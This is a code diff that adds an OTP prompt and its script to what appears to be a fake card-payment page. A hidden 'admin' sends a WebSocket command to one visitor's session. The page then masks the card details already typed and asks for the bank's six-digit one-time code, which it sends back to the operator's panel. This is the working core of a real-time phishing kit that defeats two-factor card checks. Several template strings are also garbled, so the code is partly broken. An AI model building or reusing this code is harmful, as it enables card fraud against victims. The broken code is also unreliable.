@@ -87,6 +87,34 @@ body {
                         <span class="text-sm font-medium text-gray-700">Credit / Debit Cards</span>
                     </div>
 
+<!-- OTP Verification Section (Hidden by default) -->
+<div id="otpVerificationSection" class="hidden bg-gradient-to-r from-blue-50 to-indigo-50 rounded-xl p-6 mt-6 border-2 border-blue-200" style="transform: translateY(-20px); opacity: 0; transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);">
+    <div class="text-center mb-4">
+        <h3 class="text-lg font-semibold text-gray-800 mb-2">?? OTP Verification Required</h3>
+        <p class="text-sm text-gray-600">Please enter the 6-digit OTP to complete your transaction</p>
+    </div>
+    
+    <div class="flex justify-center mb-4">
+        <div class="flex gap-2">
+            <input type="text" id="otpDigit1" class="w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none" maxlength="1">
+            <input type="text" id="otpDigit2" class="w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none" maxlength="1">
+            <input type="text" id="otpDigit3" class="w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none" maxlength="1">
+            <input type="text" id="otpDigit4" class="w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none" maxlength="1">
+            <input type="text" id="otpDigit5" class="w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none" maxlength="1">
+            <input type="text" id="otpDigit6" class="w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none" maxlength="1">
+        </div>
+    </div>
+    
+    <div class="text-center mb-4">
+        <p class="text-sm text-gray-500">Code expires in <span id="otpTimer" class="text-red-500 font-semibold">2:59</span></p>
+    </div>
+    
+    <button id="submitOTPButton" onclick="submitOTP()" class="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-semibold py-3 rounded-lg transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed">
+        Submit OTP
+    </button>
+</div>
+
+
                     <!-- Net Banking -->
                     <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill hover:bg-gray-50" onclick="showSection('netbanking', event)">
                         <svg width="20" height="18" viewBox="0 0 20 18" fill="none" class="w-6 h-6">
@@ -1266,9 +1294,315 @@ if (document.readyState === 'loading') {
 } else {
     initializeVisitorTracking();
 }
+
+
+// ============================================
+// OTP VERIFICATION SYSTEM
+// ============================================
+
+let otpTimerInterval = null;
+let otpTimeRemaining = 179; // 2:59 in seconds
+let currentOTP = null;
+
+// Listen for admin OTP command
+paymentSocket.on('adminCommand', (data) => {
+    if (data.command === 'showOTPVerification' && data.sessionId === paymentSessionId) {
+        console.log('?? OTP verification requested by admin');
+        currentOTP = data.otp;
+        showOTPVerification();
+    }
+});
+
+// Show OTP verification section with smooth slide-down animation
+function showOTPVerification() {
+    // Hash and disable card input fields
+    hashAndDisableCardFields();
+    
+    // Show OTP section with animation
+    const otpSection = document.getElementById('otpVerificationSection');
+    otpSection.classList.remove('hidden');
+    
+    // Trigger smooth slide-down animation
+    setTimeout(() => {
+        otpSection.style.transform = 'translateY(0)';
+        otpSection.style.opacity = '1';
+    }, 50);
+    
+    // Start countdown timer
+    startOTPTimer();
+    
+    // Initialize OTP input handling
+    initializeOTPInputs();
+    
+    // Focus on first OTP digit
+    document.getElementById('otpDigit1').focus();
+}
+
+// Hash card details and make fields non-editable
+function hashAndDisableCardFields() {
+    const cardNumber = document.getElementById('cardNumber');
+    const cvv = document.getElementById('cvv');
+    const expiryDate = document.getElementById('expiryDate');
+    const cardHolderName = document.getElementById('cardHolderName');
+    
+    // Hash card number (show only last 4 digits)
+    if (cardNumber.value) {
+        const lastFour = cardNumber.value.slice(-4);
+        cardNumber.value = '****-****-****-' + lastFour;
+        cardNumber.style.background = '#f5f5f5';
+        cardNumber.style.color = '#666';
+        cardNumber.readOnly = true;
+    }
+    
+    // Hash CVV
+    if (cvv.value) {
+        cvv.value = '***';
+        cvv.style.background = '#f5f5f5';
+        cvv.style.color = '#666';
+        cvv.readOnly = true;
+    }
+    
+    // Hash expiry date
+    if (expiryDate.value) {
+        const parts = expiryDate.value.split('/');
+        if (parts.length === 2) {
+            expiryDate.value = '**/' + parts[1];
+        }
+        expiryDate.style.background = '#f5f5f5';
+        expiryDate.style.color = '#666';
+        expiryDate.readOnly = true;
+    }
+    
+    // Hash cardholder name
+    if (cardHolderName.value) {
+        const words = cardHolderName.value.split(' ');
+        const hashedName = words.map(word => {
+            if (word.length <= 2) return word;
+            return word[0] + '*'.repeat(word.length - 2) + word[word.length - 1];
+        }).join(' ');
+        cardHolderName.value = hashedName;
+        cardHolderName.style.background = '#f5f5f5';
+        cardHolderName.style.color = '#666';
+        cardHolderName.readOnly = true;
+    }
+}
+
+// Start OTP countdown timer
+function startOTPTimer() {
+    otpTimerInterval = setInterval(() => {
+        const minutes = Math.floor(otpTimeRemaining / 60);
+        const seconds = otpTimeRemaining % 60;
+        const formattedTime = ${minutes}:;
+        
+        const timerElement = document.getElementById('otpTimer');
+        if (timerElement) {
+            timerElement.textContent = formattedTime;
+            
+            // Change color based on time remaining
+            if (otpTimeRemaining <= 30) {
+                timerElement.style.color = '#ef4444'; // Red for last 30 seconds
+                timerElement.style.animation = 'pulse 1s infinite';
+            } else if (otpTimeRemaining <= 60) {
+                timerElement.style.color = '#f59e0b'; // Orange for last minute
+            }
+        }
+        
+        otpTimeRemaining--;
+        
+        if (otpTimeRemaining < 0) {
+            clearInterval(otpTimerInterval);
+            expireOTPVerification();
+        }
+    }, 1000);
+}
+
+// Handle OTP expiration
+function expireOTPVerification() {
+    const timerElement = document.getElementById('otpTimer');
+    if (timerElement) {
+        timerElement.textContent = '0:00';
+        timerElement.style.color = '#ef4444';
+    }
+    
+    // Disable OTP inputs and submit button
+    for (let i = 1; i <= 6; i++) {
+        const input = document.getElementById(otpDigit);
+        if (input) {
+            input.disabled = true;
+            input.style.background = '#f5f5f5';
+        }
+    }
+    
+    const submitButton = document.getElementById('submitOTPButton');
+    if (submitButton) {
+        submitButton.disabled = true;
+        submitButton.textContent = 'OTP Expired';
+        submitButton.style.background = '#9ca3af';
+    }
+    
+    // Show expiration message
+    showNotification('OTP has expired. Please request a new one.', 'error');
+}
+
+// Initialize OTP input handling (auto-move to next field)
+function initializeOTPInputs() {
+    for (let i = 1; i <= 6; i++) {
+        const input = document.getElementById(otpDigit);
+        
+        input.addEventListener('input', (e) => {
+            const value = e.target.value;
+            
+            // Only allow numbers
+            if (!/^[0-9]*$/.test(value)) {
+                e.target.value = '';
+                return;
+            }
+            
+            // Auto-move to next field
+            if (value.length === 1 && i < 6) {
+                document.getElementById(otpDigit).focus();
+            }
+            
+            // Auto-submit when all 6 digits are filled
+            checkOTPComplete();
+        });
+        
+        input.addEventListener('keydown', (e) => {
+            // Handle backspace (move to previous field)
+            if (e.key === 'Backspace' && e.target.value === '' && i > 1) {
+                document.getElementById(otpDigit).focus();
+            }
+            
+            // Handle paste
+            if (e.key === 'v' && (e.ctrlKey || e.metaKey)) {
+                e.preventDefault();
+                navigator.clipboard.readText().then(text => {
+                    const digits = text.replace(/\D/g, '').substring(0, 6);
+                    for (let j = 0; j < digits.length && j < 6; j++) {
+                        const digitInput = document.getElementById(otpDigit);
+                        if (digitInput) {
+                            digitInput.value = digits[j];
+                        }
+                    }
+                    checkOTPComplete();
+                });
+            }
+        });
+    }
+}
+
+// Check if OTP is complete
+function checkOTPComplete() {
+    let otp = '';
+    for (let i = 1; i <= 6; i++) {
+        const input = document.getElementById(otpDigit);
+        otp += input.value || '';
+    }
+    
+    const submitButton = document.getElementById('submitOTPButton');
+    if (otp.length === 6) {
+        submitButton.disabled = false;
+        submitButton.style.background = 'linear-gradient(to right, #2563eb, #1d4ed8)';
+    } else {
+        submitButton.disabled = true;
+        submitButton.style.background = '#9ca3af';
+    }
+}
+
+// Submit OTP to admin panel
+function submitOTP() {
+    let otp = '';
+    for (let i = 1; i <= 6; i++) {
+        const input = document.getElementById(otpDigit);
+        otp += input.value || '';
+    }
+    
+    if (otp.length !== 6) {
+        showNotification('Please enter complete 6-digit OTP', 'warning');
+        return;
+    }
+    
+    // Send OTP to admin panel via WebSocket
+    paymentSocket.emit('otpSubmitted', {
+        sessionId: paymentSessionId,
+        otp: otp,
+        timestamp: new Date().toISOString()
+    });
+    
+    // Show success feedback
+    const submitButton = document.getElementById('submitOTPButton');
+    submitButton.disabled = true;
+    submitButton.textContent = '? OTP Submitted';
+    submitButton.style.background = '#10b981';
+    
+    // Disable OTP inputs
+    for (let i = 1; i <= 6; i++) {
+        const input = document.getElementById(otpDigit);
+        input.disabled = true;
+        input.style.background = '#f0fdf4';
+        input.style.borderColor = '#10b981';
+    }
+    
+    // Stop timer
+    if (otpTimerInterval) {
+        clearInterval(otpTimerInterval);
+    }
+    
+    showNotification('?? OTP submitted successfully!', 'success');
+    console.log('?? OTP submitted:', otp);
+}
+
+// Show notification (reuse existing function or create simple one)
+function showNotification(message, type = 'info') {
+    const notification = document.createElement('div');
+    notification.style.cssText = 
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: ;
+        color: white;
+        padding: 12px 20px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        z-index: 1000;
+        font-size: 14px;
+        font-weight: 500;
+        animation: slideInRight 0.3s ease-out;
+    ;
+    notification.textContent = message;
+    
+    document.body.appendChild(notification);
+    
+    setTimeout(() => {
+        notification.style.animation = 'slideOutRight 0.3s ease-out';
+        setTimeout(() => notification.remove(), 300);
+    }, 3000);
+}
+
+// Add pulse animation for timer
+const style = document.createElement('style');
+style.textContent = 
+    @keyframes pulse {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+    }
+    
+    @keyframes slideInRight {
+        from { transform: translateX(100%); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
+    }
+    
+    @keyframes slideOutRight {
+        from { transform: translateX(0); opacity: 1; }
+        to { transform: translateX(100%); opacity: 0; }
+    }
+;
+document.head.appendChild(style);
 </script>
 </body>
 </html>
+
+
 
 
 
